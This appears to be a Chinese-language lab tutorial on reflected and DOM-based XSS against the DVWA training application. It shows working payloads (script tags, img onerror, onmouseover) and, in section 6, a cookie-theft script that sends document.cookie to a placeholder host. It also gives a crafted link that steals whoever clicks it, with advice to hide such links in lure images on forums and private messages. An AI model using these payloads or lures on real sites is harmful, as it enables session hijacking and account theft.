## 反射型XSS漏洞
### 1、登陆DVWA，设置LOW的安全界别
![image](https://github.com/498946975/Security/blob/master/images/xss_1.png)
### 2、执行js代码的2种方式
```yaml
1、使用<srpipt>js代码</script>标签
    <script>alert(1)</script>
2、使用事件的方式执行js代码
```
### 3、使用image的onerror的事件，执行js代码
```yaml
img标签支持onerror 事件，在装载文档或图像的过程中如果发生了错误，就会触发onerror事件。
```
#### 获取当前站点的cookie
```shell script
<img src=## onerror=alert(document.cookie)>
```
![image](https://github.com/498946975/Security/blob/master/images/xss_2.png)
### 4、a标签，实行js代码
#### 鼠标移动到这的时候，才执行代码
```shell script
<a onmouseover=alert(document.cookie)>xxs link</a>
```
![image](https://github.com/498946975/Security/blob/master/images/xss_3.png)

### 5、DOM的xss反射
#### 1、反弹cookie
```shell script
<script>var img=document.createElement("img");img.src=alert(document.cookie); </script>
```
```yaml
代码解析：
    1、定义一个img变量
    2、这个变量就是html里面的标签，因为是document.XXX
    3、img变量的值是alert（document.cookie）
```
### 6、发送当前cookie到某个服务器
#### 必须登陆才能访问cookie
#### 一般情况下，从web服务的日志中查看cookie
#### 把cookie弹出来，访问这个http链接，上传到服务器日志
#### 用法就是
```shell script
<script> var img=document.createElement("img");img.src="http://xxxx/a?"+escape(document.cookie);
```
#### 以下链接，谁点，就发送谁172.16.120.252:8080的cookie到 http://xxxx/a?
```shell script
http://172.16.120.252:8080/vulnerabilities/xss_r/?name=<script> var img=document.createElement("img");img.src="http://xxxx/a?"+escape(document.cookie);
```
#### 诱导性图片，嵌入以上链接，更容易得手。
### 7、常用攻击场景
```yaml
论坛，留言，站内信，利用成功率更高。
```